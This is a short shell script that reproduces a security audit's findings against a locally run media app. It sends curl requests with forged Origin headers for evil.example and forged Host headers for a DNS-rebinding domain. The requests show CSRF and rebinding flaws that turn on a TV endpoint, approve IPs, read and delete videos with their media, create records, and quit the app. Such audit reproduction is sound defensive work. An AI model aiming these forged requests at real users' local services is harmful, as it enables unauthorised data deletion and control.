#!/bin/sh
# Repro for docs/audit/01-security.md. Needs the app running with:
#   TUVA_NO_OPEN=1 TUVA_DATA_DIR=$S/data TUVA_PORT=46400 TUVA_TV_PORT=46401 TUVA_LOCAL_ROOT=$S/root TUVA_TRASH=$S/faketrash.sh bun src/server/index.ts
B=http://127.0.0.1:46400
EVIL="-H Origin:https://evil.example -H Content-Type:text/plain;charset=UTF-8"
REB="-H Host:rebind.evil.example:46400 -H Origin:http://rebind.evil.example:46400"
curl -s -XPOST $B/api/tv/on $EVIL --data ''                          # SEC-1
curl -s -XPOST $B/api/tv/approve $EVIL --data '{"ip":"127.0.0.1"}'   # SEC-1
curl -si http://127.0.0.1:46401/api/videos -H Origin:https://evil.example | grep -i access-control  # SEC-1/SEC-4
curl -s $B/api/videos $REB | head -c 200                             # SEC-2
ID=$(curl -s $B/api/videos | python3 -c 'import json,sys;print(json.load(sys.stdin)[0]["id"])')
curl -s -XDELETE $B/api/videos/$ID $REB --data '{"media":true}'      # SEC-2
curl -s -XPOST $B/api/artists $EVIL --data '{"name":"CSRF"}'         # SEC-3
curl -s -XPOST $B/api/quit $EVIL --data ''                           # SEC-3
